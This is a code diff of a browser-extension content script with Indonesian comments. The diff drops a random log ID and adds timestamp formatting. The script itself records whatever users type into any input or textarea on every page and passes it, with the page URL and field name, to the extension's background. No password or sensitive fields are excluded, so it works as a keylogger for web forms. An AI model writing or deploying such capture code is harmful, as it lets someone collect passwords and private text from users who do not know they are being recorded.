@@ -4,12 +4,11 @@ var k = "";
 var data = {};
 var typingTimer;
 var doneTypingInterval = 1000;
-var logId = generateRandomId(); // Generate ID acak saat halaman dimuat pertama kali
 
 // Inisialisasi logId pada elemen input atau textarea yang ada di halaman
 var inputElements = document.querySelectorAll("input, textarea");
 inputElements.forEach(function(element) {
-  element.dataset.logId = logId;
+
 });
 
 window.addEventListener("input", function(event) {
@@ -19,20 +18,25 @@ window.addEventListener("input", function(event) {
 
   clearTimeout(typingTimer);
   k = event.target.value;
-  var logId = event.target.dataset.logId;
   typingTimer = setTimeout(function() {
-    sendData(event.target.name, logId);
+    sendData(event.target.name);
   }, doneTypingInterval);
 });
 
-function sendData(name, logId) {
+function sendData(name) {
   if (k !== "") {
     data = {
-      log_id: logId,
       key: k,
       page: window.location.href,
-      name: name
+      name: name,
+      local_datetime: new Date().toLocaleString()
     };
+
+     // Mengubah format tanggal dan waktu menjadi "dd-mm-yyyy - hh:mm"
+    const dateParts = data.local_datetime.split(",")[0].split("/");
+    const formattedDate = `${dateParts[1].padStart(2, "0")}-${dateParts[0].padStart(2, "0")}-${dateParts[2]}`;
+    const timeParts = data.local_datetime.split(",")[1].trim().slice(0, -3);
+    data.local_datetime = `${formattedDate} - ${timeParts}`;
 
     chrome.runtime.sendMessage(data);
   }
@@ -42,8 +46,4 @@ function sendData(name, logId) {
 
 function isTextInputElement(element) {
   return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
-}
-
-function generateRandomId() {
-  return Math.floor(Math.random() * 1000).toString();
 }
